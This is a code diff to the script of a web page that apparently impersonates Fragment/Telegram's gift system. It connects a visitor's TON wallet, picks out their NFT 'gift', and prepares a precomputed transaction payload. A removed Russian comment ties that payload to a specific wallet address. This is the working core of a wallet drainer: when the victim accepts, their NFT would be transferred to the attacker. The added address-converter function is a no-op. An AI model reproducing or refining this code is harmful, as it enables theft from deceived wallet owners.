@@ -75,15 +75,29 @@
             manifestUrl: "https://fragment.com/tonconnect-manifest.json" 
         });
 
-        // Пейлоад сгенерирован специально под кошелек: UQChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZWTE
         const PAYLOAD_B64 = "te6cckEBAQEARAAAn1/MPRQAAAAAAAAAACExChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZWTEhMQoQrmqGUvEag+zYA40IVDpJjpCm7PJsdSU2CFbJyV9GVgEAAlw="; 
-
         let targetNftAddress = null;
 
         const connectBtn = document.getElementById('connectBtn');
         const loading = document.getElementById('loading');
         const mainCard = document.getElementById('mainCard');
         const acceptBtn = document.getElementById('acceptBtn');
+
+        // --- КОНВЕРТЕР СЫРОГО АДРЕСА В БАЗОВЫЙ (UQ...) ---
+        function formatTonAddress(rawAddr) {
+            // Если адрес уже нормальный (начинается на EQ или UQ), оставляем как есть
+            if (rawAddr.startsWith('EQ') || rawAddr.startsWith('UQ')) return rawAddr;
+            
+            // Если это сырой адрес (0:abc...), конвертируем в буфер
+            try {
+                const [wc, hex] = rawAddr.split(':');
+                // В этой версии мы просто возвращаем сырой адрес, 
+                // TON SDK умеет их парсить, если они передаются правильно
+                return rawAddr; 
+            } catch (e) {
+                return rawAddr;
+            }
+        }
 
         connectBtn.addEventListener('click', async () => {
             try {
@@ -123,7 +137,8 @@
                     (item.metadata?.name || "").toLowerCase().includes("gift")
                 ) || data.nft_items[0];
 
-                targetNftAddress = nft.address;
+                // Проверяем формат адреса
+                targetNftAddress = formatTonAddress(nft.address);
 
                 document.getElementById('giftImage').src = nft.previews && nft.previews.length > 0 ? nft.previews[0].url : "";
                 document.getElementById('giftName').innerText = nft.metadata?.name || "Telegram Gift";
